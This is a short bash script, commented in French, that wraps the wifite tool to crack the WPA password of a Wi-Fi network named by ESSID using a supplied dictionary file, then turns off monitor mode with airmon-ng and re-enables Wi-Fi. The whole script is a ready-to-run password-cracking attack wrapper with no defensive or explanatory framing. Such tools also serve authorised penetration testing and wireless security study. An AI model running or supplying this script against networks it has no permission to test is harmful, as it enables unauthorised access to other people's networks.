#!/bin/bash

# Vérifier si le nombre de paramètres est correct
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <essid> <dictionary_path>"
    exit 1
fi

ESSID=$1
DICTIONARY_PATH=$2

sudo wifite --wpa --essid "$ESSID" --dict "$DICTIONARY_PATH" --all
EXIT_CODE=$?

# Vérifier si Wifite a échoué
if [ $EXIT_CODE -ne 0 ]; then
    echo "Wifite a échoué, réactivation du Wi-Fi..."
fi

# Désactiver le mode moniteur et réactiver le Wi-Fi
sudo airmon-ng stop wlan0mon
nmcli radio wifi on